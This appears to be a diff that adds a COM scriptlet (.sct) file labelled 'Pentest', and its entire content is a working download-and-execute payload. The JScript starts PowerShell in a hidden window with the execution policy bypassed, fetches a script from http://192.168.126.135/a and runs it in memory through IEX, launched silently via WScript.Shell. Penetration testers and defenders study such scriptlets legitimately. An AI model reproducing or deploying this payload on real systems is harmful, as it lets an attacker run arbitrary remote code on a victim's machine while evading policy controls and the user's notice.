@@ -1,0 +1,15 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration         
+progid="Pentest"       
+classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+<script language="JScript">
+ 
+<![CDATA[   
+var c= 'powershell.exe -w hidden -ep Bypass -nologo -noprofile "IEX ((new-object net.webclient).downloadstring(\'http://192.168.126.135/a\'))"'; 
+new ActiveXObject("WScript.Shell").Run(c,0);
+]]>
+ 
+</script>
+</registration>
+</scriptlet>
